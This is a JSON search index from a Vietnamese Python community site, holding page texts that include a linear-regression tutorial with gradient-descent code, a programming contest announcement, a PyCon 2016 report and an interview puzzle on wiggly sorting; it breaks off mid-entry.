{"pages":[{"url":"https://www.vithon.org/search.html","text":"\n\n\n\n\n\n  Search Home\n | Python Cho Người Việt\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nPython Cho Người Việt \n\n\n\n\n\nToggle navigation\n\n\n\n\nPython Cho Người Việt\n\n\n\n\n\nBài chỉ dẫn 2.5\n\n\nTin tức\n\n\nBài viết\n\n\nDiễn đàn\n\n\nGiới thiệu\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n    Search Results\n  \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nLinks\n\n \n\n    Python.org\n  \n\n\n\nBrowse content by\n\n Authors\n Categories\n Dates\n Tags\n\n\n\n\n\n\n Back to top\n\n\n© 2007-2018 Nhóm PCNV.\n          Site generated by  Pelican.\n Plumage theme by Kevin Deldycke.\n        \n\n\n\n\n\n\n\n\n\n\n\n\n    $(document).ready(function() {\n      $('#tipue_search_input').tipuesearch({\n          'mode' : 'json',\n          'show': 10,\n          'newWindow': false,\n          'contentLocation': './tipuesearch_content.json'\n      });\n    });\n  \n\n","tags":"","title":"  Search Home\n | Python Cho Người Việt"},{"url":"page/about.html","text":"Python cho người Việt (PCNV) là một trang mạng được sinh ra với mục đích mở rộng việc sử dụng ngôn ngữ lập trình Python cho người Việt Nam. Thông qua những bài hướng dẫn, các đề tài nghiên cứu, những cuộc trò chuyện trên mạng, và các buổi gặp mặt trực tiếp, Python cho người Việt mong muốn sẽ đem lại cho thành viên, cũng như người ghé thăm một chút kiến thức, một ít hiểu biết về ngôn ngữ lập trình Python, và cho những ai đã sử dụng Python thành thạo một vài ý tưởng sáng tạo mới. Python cho người Việt là một trang mạng cộng đồng, lập ra bởi một nhóm bạn có cùng sở thích và tình yêu dành cho ngôn ngữ Python. Thông qua trang mạng này, họ hy vọng sẽ gặp được những người bạn tâm đầu ý hợp ở khắp nơi trên thế giới. Trang mạng Trang mạng này sử dụng hệ thống quản lý nội dung Zine được viết bằng ngôn ngữ Python. Dịch vụ Trang mạng cung cấp thành viên các dịch vụ sau: Thông tin mới nhất về những phát triển trong thế giới Python Các bài viết về ngôn ngữ, thư viện, và ứng dụng Python Những dự án liên quan đến Python và ứng dụng, cũng như những đoạn mã có thể sử dụng ngay Và dĩ nhiên, một nơi tụ hội những người yêu thích ngôn ngữ Python, và những người đang sử dụng Ruby, Perl, PHP, v.v... có ý định chuyển qua một ngôn ngữ tốt hơn Thông tin tuyển dụng về công việc liên quan đến Python Trong tương lai, những dịch vụ sau sẽ có thể được thêm vào: Hệ quản lý phiên bản mã nguồn Tư vấn, đào tạo, và phát triển các dự án Python miễn phí hoặc theo hợp đồng Nếu bạn quan tâm hoặc mong muốn tham gia, xin vui lòng xem mục ngay dưới và liên lạc các thành viên. Liên hệ Nhóm thành viên của Python cho người Việt thường trò chuyện qua mạng tại phòng tán gẫu #vithon ở máy chủ irc.freenode.net . Mọi ý kiến, bài viết hoặc đóng góp xin gửi về địa chỉ admin+frontpage@vithon.org (xin vui lòng bỏ +frontpage trước khi gửi).","tags":"pages","title":"Giới thiệu"},{"url":"2018/04/may-hoc-pho-thong-1.html","text":"Giới thiệu Loạt bài \"Máy học phổ thông\" Loạt bài Máy học phổ thông nhằm vào một mục tiêu đơn giản là diễn giải một số kỹ thuật máy học với kiến thức toán phổ thông mà học sinh phổ thông trung học (cấp 3, khoảng lớp 11, 12) có thể hiểu, và áp dụng ngay lập tức. Dĩ nhiên, vì đây là trang mạng của nhóm Python cho người Việt nên ngôn ngữ lập trình được chọn để thể hiện các kỹ thuật trong loạt bài này sẽ là ngôn ngữ Python. Máy học Máy học (machine learning) là một nhánh khoa học máy tính tận dụng các kỹ thuật tính toán để tạo cho máy tính khả năng \"học\" từ dữ liệu, mà không cần phải được lập trình rõ ràng. Một số ví dụ ứng dụng máy học bao gồm việc phỏng đoán giá nhà dựa trên diện tích đất, tự động phân loại hoa từ kích thước cánh, hoặc tự tìm đường nhanh nhất để thoát khỏi mê cung. Máy học thường được chia làm ba nhóm chính: Có giám sát (supervised) Các kỹ thuật trong nhóm này tận dụng sự hiện diện của kết quả gốc để điều chỉnh việc học của máy tính. Ví dụ như giá nhà đã bán gần đây có thể giúp cho việc dự đoán giá già sẽ bán được trong tương lai. Không giám sát (unsupervised) Các kỹ thuật trong nhóm này không sử dụng kết quả gốc nhưng vẫn có thể phân loại dữ liệu đầu vào thành nhiều nhóm riêng biệt. Ví dụ như các loại hoa có thể được phân loại theo kích thước cánh hoa to hay nhỏ, dài hay ngắn một cách tự động mà không cần bất kỳ chỉ dẫn cụ thể nào. Củng cố (reinforcement) Sự phối hợp giữa học có giám sát, và học không giám sát tạo ra các kỹ thuật học củng cố trong đó kết quả gốc chỉ được sử dụng sau khi một loạt các lựa chọn đã xảy ra. Ví dụ trong khi tìm đường thoát khỏi mê cung, chỉ sau khi tìm được đường đến cửa ra thì ta mới biết con đường đã đi là con đường tốt. Hồi quy tuyến tính Một trong các kỹ thuật phổ dụng nhất trong máy học là kỹ thuật phân tích hồi quy tuyến tính (linear regression). Tên gọi này có hai phần quan trọng: Hồi quy (regression) Phân tích hồi quy cho phép ta tìm ra quan hệ giữa các biến độc lập (giả sử là \\(x_1, x_2, \\dots, x_n\\) ) và biến phụ thuộc (giả sử là \\(y\\) ). Bình thường chúng ta sẽ có sẵn mối quan hệ \\(y = f(x_1, x_2, \\dots, x_n)\\) để từ đó xác định giá trị của biến phụ thuộc theo biến độc lập. Mục tiêu của phân tích hồi quy là tìm mối quan hệ từ các giá trị của biến độc lập và biến phụ thuộc. Tuyến tính (linear) Trong hồi quy tuyến tính, mối quan hệ giữa các biến độc lập và biến phụ thuộc được giả định là một mối quan hệ tuyến tính. Tức là \\(y = \\theta_n \\times x_n + \\theta_{n-1} \\times x_{n-1} + \\dots + \\theta_1 \\times x_1 + \\theta_0 \\times 1\\) với \\(\\theta_0, \\theta_1, \\dots, \\theta_n\\) là các tham số cần tìm. Các tài liệu khác cũng hay dùng ký hiệu \\(w\\) (trọng số của mô hình, tiếng Anh là weight) thay vì \\(\\theta\\) . Chúng ta sẽ từng bước xây dựng và xem xét nguyên tắc của phương pháp hồi quy tuyến tính thông qua một số ví dụ trong các mục kế tiếp. Ước lượng \\(y = ax + b\\) Không có sai số Giả sử chúng ta có bảng dữ liệu đầu vào như sau: Dòng \\(x_1\\) \\(y\\) 0 -2 0 1 0 -4 Chúng ta muốn tìm xem với \\(x_1 = 2\\) (không có trong bảng trên) thì sẽ nhận được giá trị \\(y\\) là bao nhiêu. Đường thẳng đi qua chính xác hai điểm from matplotlib import pyplot as plt xs = [ - 2 , 0 ] ys = [ 0 , - 4 ] plt . plot ( xs , ys , 'bo' ) plt . plot ( xs , ys , 'g--' ) plt . savefig ( 'linear-reg-1.png' ) Vì ta đã giả định \\(y = \\theta_1 x_1 + \\theta_0\\) , và ta có đúng hai điểm đầu vào, nên cách đơn giản nhất là giải hệ phương trình để tìm ra tham số \\(\\theta_1, \\theta_0\\) của quan hệ đó. Ta sẽ có \\(\\theta_1 = -2, \\theta_0 = -4\\) . Vậy nếu \\(x_1 = 2\\) giá trị tương ứng sẽ là \\(y = -8\\) . Đây chính là cách giải quyết vấn đề bình thường, khi ta phải lập trình rõ ràng từng bước cần làm để máy tính thực hiện. Nếu như bảng dữ liệu đầu vào có nhiều hơn 2 dòng thì làm sao chương trình của chúng ta tìm ra mối quan hệ giữa các điểm này? Thêm sai số Giả sử như bảng đầu vào của chúng ta bây giờ có thêm một số điểm mới như sau: Dòng \\(x_1\\) \\(y\\) 0 -2 0 1 -1 -3 2 0 -4 3 1 -3 Phương pháp chính xác không còn có thể được dùng nữa vì bây giờ ta có 4 điểm, và chúng không nằm trên cùng một đường thẳng nào cả. Không có đường thẳng nào đi qua 4 điểm này from matplotlib import pyplot as plt xs = [ - 2 , - 1 , 0 , 1 ] ys = [ 0 , - 3 , - 4 , - 3 ] plt . plot ( xs , ys , 'bo' ) plt . savefig ( 'linear-reg-2.png' ) Do đó, chúng ta sẽ chấp nhận có sai số trong việc hồi quy để tìm ra mối quan hệ tuyến tính giữa các điểm đầu vào. Chúng ta giả sử rằng mối quan hệ tìm được là \\(\\hat{y} = \\theta_1 x_1 + \\theta_0 x_0\\) , với giá trị \\(x_0 = 1\\) . Ký hiệu \\(\\hat{y}\\) đọc là \"y mũ\" để phân biệt với \"y thường\", và thường được dùng để nhấn mạnh đây là giá trị phỏng đoán, không phải giá trị thực. Sai số giữa \\(\\hat{y}\\) và \\(y\\) đơn giản là \\(\\hat{y} - y\\) . Để không phải quan tâm \\(\\hat{y}\\) lớn hơn, hay nhỏ hơn \\(y\\) , ta sẽ dùng bình phương của sai số \\((\\hat{y} - y)&#94;2\\) . Với mỗi giá trị đầu vào, ta sẽ có sai số cho dòng đó. Tổng bình phương sai số (residual sum of squares, sum of squared residuals, sum of squared errors) của các dòng đầu vào thể hiện độ khớp giữa mối quan hệ tìm được, và mối quan hệ thật sự (mà chúng ta không biết). Do đó, mục tiêu của chúng ta là tìm các tham số \\(\\theta_1, \\theta_0\\) sao cho tổng bình phương sai số của các điểm là nhỏ nhất. Gọi \\(\\vec{\\theta} = (\\theta_0, \\theta_1)\\) là biểu diễn dạng véc tơ của hai giá trị \\(\\theta_1, \\theta_0\\) . Hàm mất mát (loss function, cost function) của phương pháp hồi quy tuyến tính có dạng: \\begin{equation*} \\mathcal{L}(\\vec{\\theta}) = \\sum_{i=0}&#94;3 \\left( \\hat{y}&#94;{(i)} - y&#94;{(i)} \\right)&#94;2 \\end{equation*} Nhưng vì chúng ta chỉ quan tâm đến việc tìm giá trị cực tiểu của hàm mất mát, người ta thường nhân với \\(\\frac{1}{2}\\) để khi lấy đạo hàm thì bình phương sẽ khử đi \\(\\frac{1}{2}\\) và công thức nhìn đẹp hơn: \\begin{equation*} \\mathcal{L}(\\vec{\\theta}) = \\frac{1}{2} \\sum_{i=0}&#94;3 \\left( \\hat{y}&#94;{(i)} - y&#94;{(i)} \\right)&#94;2 \\end{equation*} (Ngoài ra, nhiều tài liệu còn chia cho số dòng trong bảng đầu vào (tức là lấy trung bình cộng) để làm cho phép tính số thực trên máy tính được chính xác hơn.) Ta cần tìm một véc tơ \\(\\vec{\\theta_{min}}\\) sao cho \\(\\mathcal{L}(\\vec{\\theta_{min}})\\) có giá trị cực tiểu. Sử dụng ký hiệu \\(\\mathop{\\mathrm{arg\\,min}}_x f(x)\\) để biểu diễn một hàm trả về giá trị \\(x\\) mà tại đó giá trị của \\(f(x)\\) là nhỏ nhất, chúng ta viết lại mục tiêu của chúng ta như sau: \\begin{equation*} \\vec{\\theta_{min}} = \\mathop{\\mathrm{arg\\,min}}_{\\vec{\\theta}} \\mathcal{L}(\\vec{\\theta}) = \\mathop{\\mathrm{arg\\,min}}_{\\vec{\\theta}} \\cfrac{1}{2} \\sum_{i=0}&#94;3 \\left( \\hat{y}&#94;{(i)} - y&#94;{(i)} \\right)&#94;2 \\end{equation*} Một trong những cách để tìm \\(\\vec{\\theta_{min}}\\) là tính đạo hàm bậc nhất của \\(\\mathcal{L}(\\vec{\\theta})\\) theo \\(\\vec{\\theta}\\) và giải phương trình để đạo hàm đó đạt giá trị 0. Tuy nhiên, cách làm này nằm ngoài phạm vi Toán phổ thông, và cần phải đến chương trình đại học đại cương về Đại số tuyến tính (Linear Algebra) và Giải tích ma trận (Matrix Calculus) chúng ta mới có thể làm. Một cách khác để tìm \\(\\vec{\\theta_{min}}\\) là sử dụng kỹ thuật xuống dốc (gradient descent). Kỹ thuật xuống dốc có thể được sử dụng ở đây vì hàm mất mát trong trường hợp này chỉ có một cực trị toàn cục (global optimum) (và cực trị này là cực tiểu) cho nên kỹ thuật xuống dốc được đảm bảo sẽ hội tụ (converge) đến giá trị đấy. Kỹ thuật này sẽ được giải thích cặn kẽ hơn trong một bài viết khác. Ở đây, chúng ta chỉ cần tính đạo hàm riêng (partial derivative) của \\(\\mathcal{L}(\\vec{\\theta})\\) theo từng biến thành phần \\(\\theta_1, \\theta_0\\) để cập nhật lại chính các biến đó. Với \\(j \\in \\{ 0, 1 \\}\\) , công thức cập nhật \\(\\theta_j\\) được cho bởi: \\begin{equation*} \\theta_j&#94;{(t+1)} = \\theta_j&#94;{(t)} - \\alpha \\times \\cfrac{\\partial}{\\partial \\theta_j} \\mathcal{L}(\\vec{\\theta&#94;{(t)}}) \\end{equation*} Hệ số \\(\\alpha\\) được gọi là tốc độ học (learning rate). Nhiều tài liệu sử dụng \\(\\gamma\\) hoặc \\(\\eta\\) thay cho \\(\\alpha\\) trong công thức trên, nhưng chúng đều có ý nghĩa như nhau cả. Đạo hàm riêng của \\(\\mathcal{L}(\\vec{\\theta})\\) theo \\(\\theta_j\\) : \\begin{align*} \\cfrac{\\partial}{\\partial \\theta_j} \\mathcal{L}(\\vec{\\theta}) &= \\cfrac{1}{2} \\cfrac{\\partial}{\\partial \\theta_j} \\sum_{i=0}&#94;3 \\left( \\hat{y}&#94;{(i)} - y&#94;{(i)} \\right)&#94;2 \\\\ &= \\sum_{i=0}&#94;3 \\left( \\hat{y}&#94;{(i)} - y&#94;{(i)} \\right) \\cfrac{\\partial}{\\partial \\theta_j} \\left( \\hat{y}&#94;{(i)} - y&#94;{(i)} \\right) \\\\ &= \\sum_{i=0}&#94;3 \\left( \\hat{y}&#94;{(i)} - y&#94;{(i)} \\right) \\cfrac{\\partial}{\\partial \\theta_j} \\hat{y}&#94;{(i)} \\\\ &= \\sum_{i=0}&#94;3 \\left( \\hat{y}&#94;{(i)} - y&#94;{(i)} \\right) x_j&#94;{(i)} \\end{align*} Ráp vào công thức cập nhật \\(\\theta_j\\) : \\begin{equation*} \\theta_j&#94;{(t+1)} = \\theta_j&#94;{(t)} + \\alpha \\times \\sum_{i=0}&#94;3 \\left( y&#94;{(i)} - \\hat{y}&#94;{(i)} \\right) x_j&#94;{(i)} \\end{equation*} Như vậy, toàn bộ việc giải ra \\(\\vec{\\theta}\\) được tóm lại ở hai bước: Khởi tạo các giá trị \\(\\theta_0, \\theta_1\\) ngẫu nhiên. Trong khi vẫn chưa hội tụ thì cập nhật \\(\\theta_0, \\theta_1\\) theo công thức trên. Điều kiện hội tụ có thể gồm một hoặc vài điều kiện sau: Giá trị hàm mất mát chỉ thay đổi rất ít. Giá trị của \\(\\vec{\\theta}\\) thay đổi rất ít. Số lần lặp vượt quá một giới hạn nào đó. Hoặc các điều kiện khác tùy vào khả năng sáng tạo. Ta sẽ cài đặt ý tưởng của phương pháp hồi quy tuyến tính như sau: # Bảng đầu vào. xs = [( 1 , - 2 ), ( 1 , - 1 ), ( 1 , 0 ), ( 1 , 1 )] # (x_0, x_1) ys = [ 0 , - 3 , - 4 , - 3 ] # y # Khởi tạo theta là vec tơ (0, 0). theta = [ 0 ] * len ( xs [ 0 ]) # Định tốc độ học. alpha = 0.01 # Điều kiện hội tụ là lặp 1000 lần. for _ in range ( 1000 ): theta_new = [ 0 ] * len ( theta ) for j in range ( len ( theta )): # Tính độ dốc theo theta_j. gradient = 0 for i in range ( len ( ys )): y_hat = theta [ 1 ] * xs [ i ][ 1 ] + theta [ 0 ] * xs [ i ][ 0 ] gradient += ( ys [ i ] - y_hat ) * xs [ i ][ j ] # Cập nhật theta. theta_new [ j ] = theta [ j ] + alpha * gradient theta = theta_new print ( theta ) Kết quả thực thi sẽ là: [-2.9999999999982405, -0.9999999999989124] Tức là mối quan hệ tuyến tính giữa 4 điểm là \\(\\hat{y} = -3.0 \\times x_1 + -1.0\\) . Mối quan hệ này được thể hiện qua đồ thị bên dưới. Đường khớp dữ liệu \\(\\theta_0 = -3.0\\) và \\(\\theta_1 = -1.0\\) from matplotlib import pyplot as plt xs = [ - 2 , - 1 , 0 , 1 ] ys = [ 0 , - 3 , - 4 , - 3 ] plt . plot ( xs , ys , 'bo' ) plt . plot ([ min ( xs ), max ( xs )], [ - 1.0 * min ( xs ) - 3.0 , - 1.0 * max ( xs ) - 3.0 ], 'g--' ) plt . savefig ( 'linear-reg-3.png' ) Xây dựng thuộc tính (feature engineering) Mặc dù phương pháp hồi quy tuyến tính giả định mối quan hệ tuyến tính, chúng ta vẫn có thể tìm được các mối quan hệ đa thức bậc cao, hoặc phi tuyến. Tính chất tuyến tính chỉ là giữa biến phụ thuộc và biến độc lập, còn giữa các biến độc lập với nhau thì chúng có thể có những quan hệ phi tuyến. Xét ví dụ trong mục ở trên, với bốn điểm không thẳng hàng. Dòng \\(x_1\\) \\(y\\) 0 -2 0 1 -1 -3 2 0 -4 3 1 -3 Ta có thể thêm một cột \\(x_2 = x_1&#94;2\\) để có bảng: Dòng \\(x_2\\) \\(x_1\\) \\(y\\) 0 4 -2 0 1 1 -1 -3 2 0 0 -4 3 1 1 -3 Chúng ta muốn tìm quan hệ \\(\\hat{y} = \\theta_2 x_2 + \\theta_1 x_1 + \\theta_0 x_0\\) với \\(x_0 = 1\\) . Và chúng ta chỉ cần sửa một chút mã nguồn trong phần trên: # Bảng đầu vào. xs = [( 1 , - 2 , 4 ), ( 1 , - 1 , 1 ), ( 1 , 0 , 0 ), ( 1 , 1 , 1 )] # (x_0, x_1, x_2) ys = [ 0 , - 3 , - 4 , - 3 ] # y # Khởi tạo theta là vec tơ (0, 0, 0). theta = [ 0 ] * len ( xs [ 0 ]) # Định tốc độ học. alpha = 0.01 # Điều kiện hội tụ là lặp 10000 lần. for _ in range ( 10000 ): theta_new = [ 0 ] * len ( theta ) for j in range ( len ( theta )): # Tính độ dốc theo theta_j. gradient = 0 for i in range ( len ( ys )): y_hat = ( theta [ 2 ] * xs [ i ][ 2 ] + theta [ 1 ] * xs [ i ][ 1 ] + theta [ 0 ] * xs [ i ][ 0 ]) gradient += ( ys [ i ] - y_hat ) * xs [ i ][ j ] # Cập nhật theta. theta_new [ j ] = theta [ j ] + alpha * gradient theta = theta_new print ( theta ) Kết quả nhận được: [-3.999999999999987, -4.7184218854317494e-15, 0.9999999999999933] Hay viết cách khác \\(\\hat{y} = 1.0 \\times x_2 - 0.0 \\times x_1 - 4.0\\) . Vì \\(x_2 = x_1&#94;2\\) , quan hệ này là \\(\\hat{y} = x_1&#94;2 - 4.0\\) , rõ ràng là một đường pa-ra-bôn nhị thức bậc hai. Đường pa-ra-bôn đi qua bốn điểm, cũng chính là mối quan hệ thực giữa \\(y\\) và \\(x_1\\) . from matplotlib import pyplot as plt xs = [ - 2 , - 1 , 0 , 1 ] ys = [ 0 , - 3 , - 4 , - 3 ] plt . plot ( xs , ys , 'bo' ) plt . plot ([ x / 100.0 for x in range ( min ( xs ) * 100 , max ( xs ) * 100 )], [( x / 100.0 ) ** 2 - 4.0 for x in range ( min ( xs ) * 100 , max ( xs ) * 100 )], 'g--' ) plt . savefig ( 'linear-reg-4.png' ) Việc thêm cột vào bảng như chúng ta đã làm được gọi là xây dựng thuộc tính (feature engineering). Chúng ta tạo ra một thuộc tính mới, hoặc cắt bỏ đi các thuộc tính đã có nhằm giúp cho mô hình của chúng ta khớp (fit) tốt hơn với dữ liệu, hoặc đạt được một số tính chất nào đó mà chúng ta cần. Công việc xây dựng thuộc tính rất phụ thuộc vào kinh nghiệm, và sự tinh tế của người làm. Nói trắng ra thì nó mang tính chất mò và hên rất nhiều. Tóm tắt Bài viết này giới thiệu tổng quát về máy học, và xây dựng nên kỹ thuật hồi quy tuyến tính từ nền tảng. Thông qua kỹ thuật đơn giản nhưng rất phổ dụng này, chúng ta biết đến khái niệm hàm mất mát và bài toán máy học được chuyển về bài toán tối ưu hàm mất mát. Ở bài viết kế tiếp, chúng ta sẽ nói kỹ hơn về kỹ thuật xuống dốc đã được sử dụng trong việc tìm điểm cực tiểu này. Tài liệu đọc thêm Tài liệu giảng trong môn CS229 Machine Learning do Dan Boneh và Andrew Ng dạy ở đại học Stanford. Bài 3: Linear Regression ở trang mạng Machine Learning cơ bản của Vũ Hữu Tiệp ở Đại học bang Pennsylvania (Pennsylvania State University), Hoa Kỳ. Scikit-learn: Linear regression ở trang mạng của Ông Xuân Hồng . if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) { var align = \"center\", indent = \"0em\", linebreak = \"false\"; if (false) { align = (screen.width < 768) ? \"left\" : align; indent = (screen.width < 768) ? \"0em\" : indent; linebreak = (screen.width < 768) ? 'true' : linebreak; } var mathjaxscript = document.createElement('script'); mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#'; mathjaxscript.type = 'text/javascript'; mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.3/latest.js?config=TeX-AMS-MML_HTMLorMML'; mathjaxscript[(window.opera ? \"innerHTML\" : \"text\")] = \"MathJax.Hub.Config({\" + \" config: ['MMLorHTML.js'],\" + \" TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'AMS' } },\" + \" jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" + \" extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" + \" displayAlign: '\"+ align +\"',\" + \" displayIndent: '\"+ indent +\"',\" + \" showMathMenu: true,\" + \" messageStyle: 'normal',\" + \" tex2jax: { \" + \" inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" + \" displayMath: [ ['$$','$$'] ],\" + \" processEscapes: true,\" + \" preview: 'TeX',\" + \" }, \" + \" 'HTML-CSS': { \" + \" styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" + \" linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" + \" }, \" + \"}); \" + \"if ('default' !== 'default') {\" + \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"}\"; (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript); }","tags":"Bài viết","title":"Máy học phổ thông (1)"},{"url":"2016/06/dieu-khien-thang-may.html","text":"Cập nhật: Do số lượng bài tham gia vẫn còn ít (dẫn đến cuộc thi đua không còn thú vị nữa) nên ban tổ chức dời lại hạn nộp bài đến hết ngày 21 tháng 07 . Nhân việc PyCon vừa qua, nhóm PCNV hân hạnh tổ chức cuộc thi Điều khiển thang máy! Tương tự như cuộc thi Bắn suồng , cuộc thi Điều khiển thang máy cũng là một cuộc thi lập trình Python và có một số điều lệ sau: Trò chơi được giới thiệu tại http://codelift.org . Người tham dự có thể thử mã của mình tại trang mạng đó. Người tham gia phải nộp mã Python (tập tin .py ) tới admin+codelift@vithon.org , và đồng ý với việc nhóm PCNV có toàn quyền sử dụng mã đó cho mọi mục đích. Người tham gia cũng phải gửi thêm một bài viết (dưới dạng .txt ) giới thiệu trò chơi, và cách giải của mình đến cùng địa chỉ thư trên. Hạn nhận bài là ngày 14 tháng 07 năm 2016. Bài thi sẽ được đọc qua trước, và sẽ được chạy trên cùng hệ thống codelift.org. Bài thi với số điểm trung bình cao nhất trong 3 tòa nhà được chọn khi chấm sẽ là bài thắng giải. Ba phần thưởng dành cho ba bài thi với số điểm trung bình cao nhất là ba cái áo thun và một số miếng dán mà bạn Nam đã gửi cho nhóm từ PyCon. Người hạng nhất sẽ được quyền chọn mẫu áo trước, rồi đến hạng nhì, và hạng ba. Mẫu áo đã được công bố trong thư mục chia sẻ ở bài trước. Quyết định của ban tổ chức là cuối cùng. Mọi thắc mắc và thảo luận xin hãy dùng diễn đàn . Chúc may mắn và nhiều niềm vui!","tags":"Tin tức","title":"Điều khiển thang máy"},{"url":"2016/06/pycon-2016-o-thanh-pho-portland.html","text":"Hai tuần trước mình có tham dự hội thảo PyCon 2016 ở thành phố Portland, tiểu bang Oregon, vùng Tây Bắc nước Mỹ. Cũng như mọi năm, PyCon vẫn là hội thảo tuyệt vời nhất từ trước đến nay. Tham dự hội thảo không chỉ có lập trình viên mà còn có nhiều nhà khoa học, giáo viên, sinh viên, và cả học sinh tiểu học nữa! Mình chưa từng thấy hội thảo khoa học kỹ thuật nào mà có thể quy tập được nhiều đối tượng tham gia như vậy. Một điều tuyệt vời nữa là có rất nhiều các bạn nam, các bạn nữ, và cả các bạn chuyển giới tham gia PyCon. Điều này cho thấy Python không chỉ là một ngôn ngữ \"có sẵn pin\", mà có còn là một cộng đồng rất \"bao gồm\". Ai cũng được hoan nghênh, ai cũng được đối xử một cách tôn trọng, không có sự phân biệt đối xử. Sau đây là một số hình ảnh mình ghi lại để chia sẻ cùng các bạn. Hy vọng một dịp nào đó sẽ gặp được các bạn ở trong các kỳ hội thảo trong tương lai: Bảng hiệu PyCon 2016 ở dọc đường đến trung tâm hội nghị Portland. Em bé đứng nhìn tượng Martin Luther King, Jr. ở trước trung tâm hội nghị. Hội trường chính, nơi diễn ra các bài tham luận chủ chốt. Các bạn có thể thấy con lắc biểu tượng của trung tâm hội nghị Portland trong hai hình sau: Khu đăng ký (hình 1). Khu đăng ký (hình 2). Khu vực phòng Oregon (hình 1). Khu vực phòng Oregon (hình 2). Khu vực phòng Oregon (hình 3). Khu vực phòng Oregon (hình 4). Khu vực phòng Portland (hình 1). Khu vực phòng Portland (hình 2). Hình Guido bắt đầu bài tham luận chính. Guido vẫn mặc chiếc áo bé gái như mọi năm. Không biết cái áo này sẽ còn theo Guido đến PyCon năm nào đây. Điều này cũng cho thấy Guido rất quan tâm đến sự đối xử bình đẳng, tôn trọng giới tính ở hội thảo PyCon. Bảng đăng ký không gian mở (open spaces) ở hội thảo. Ảnh trưng bày (poster session) (hình 1). Ảnh trưng bày (poster session) (hình 2). Hai hình ảnh của tác giả bài viết: Ảnh đẹp nhất hội thảo (hình 1). Ảnh đẹp nhất hội thảo (hình 2). Toàn bộ các hình ảnh có thể được truy cập trong thư mục https://drive.google.com/folderview?id=0B4aYVYJVZM_zT2tzZGdTNTUwQWc&usp=sharing .","tags":"Tin tức","title":"PyCon 2016 ở thành phố Portland"},{"url":"2015/11/sach-python-rat-la-co-ban.html","text":"Bạn Võ Duy Tuấn có thực hiện một quyển sách về Python với tựa đề Python rất là cơ bản . Nhóm PCNV xin giới thiệu cùng các bạn. http://bloghoctap.com/python/download-sach-python-rat-la-co-ban.html","tags":"Tin tức","title":"Sách \"Python rất là cơ bản\""},{"url":"2015/05/phong-van-sap-xep-lac-lu.html","text":"Câu hỏi Cho một mảng A các số nguyên a[i] , tìm cách sắp xếp mảng sao cho phần tử thứ nhất nhỏ hơn phần tử thứ hai, phần tử thứ hai lớn hơn phần tử thứ ba, phần tử thứ ba nhỏ hơn phần tử thứ tư v.v... Tức là: a[0] <= a[1] >= a[2] <= a[3] >= a[4] ... Ta gọi một mảng có thứ tự như vậy là một mảng đã được sắp xếp lắc lư (wiggly sorted). Phân tích Ta nhận xét rằng yêu cầu thứ tự chỉ áp dụng vào hai phần tử lân cận của phần tử đang xét. Ví dụ, phần tử a[1] chỉ cần lớn hơn hai phần tử a[0] và a[2] , ngoài ra không còn quan hệ với phần tử nào nữa. Điều đó dẫn đến ý tưởng giải sẽ rất có thể ở dạng tham ăn ( greedy algorithm ). Giả sử như ta đã có mảng A' có độ dài 2n (chẵn) thỏa mãn điều kiện. Phần tử kế tiếp ( 2n + 1 ) vì ở vị trí lẻ nên sẽ phải nhỏ hơn phần tử cuối cùng trong mảng, đồng thời cũng phải đảm bảo nhỏ hơn phần tử sau đó ( 2n + 2 ). Vì ta không biết phần tử ( 2n + 2 ) sẽ có giá trị bao nhiêu nên cách an toàn nhất để thỏa mãn hai điều kiện cho phần tử 2n + 1 là chọn phần tử nhỏ nhất trong số các phần tử còn lại của A . Lập luận tương tự cho thấy rằng phần tử ở vị trí chẵn nên có giá trị lớn nhất trong số các phần tử còn lại. Tóm lại, cách giải câu hỏi này sẽ bao gồm hai bước chính: Sắp xếp mảng A theo thứ tự tăng dần. Lần lượt gán a[0] = min(A) , và a[1] = max(A[1 : ]) , và a[2] = min(A[2 : ]) , v.v... Dĩ nhiên là ta không cần gọi min hay max mà chỉ cần giữ hai biến chỉ mục từ đầu, và cuối mảng A để tìm ngay giá trị cực tiểu hay cực đại vì A đã được sắp xếp ở bước đầu tiên. Độ phức tạp thực thi của cách giải này phụ thuộc vào thuộc toán sắp xếp sử dụng ở bước đầu tiên. Vấn đề cài đặt cách giải xin được để lại cho bạn đọc. Diễn đàn là nơi tốt nhất để trao đổi về các yếu tố liên quan đến cài đặt. Tổng kết Qua loạt bài Phỏng vấn , tác giả hy vọng rằng bạn đọc nhận ra được sự quan trọng của bộ kiến thức nền tảng, đặc biệt là các cấu trúc dữ liệu phổ biến. Từ các kiến thức nền tảng này, chúng ta có thể giải quyết được rất nhiều những vấn đề khác. Python cùng với phương châm kèm cả pin đem đến cho chúng ta một loạt các cấu trúc dữ liệu qua các kiểu, hoặc mô-đun có sẵn. Python thật sự là một công cụ mạnh mẽ và hữu ích.","tags":"Bài viết","title":"Phỏng vấn: Sắp xếp lắc 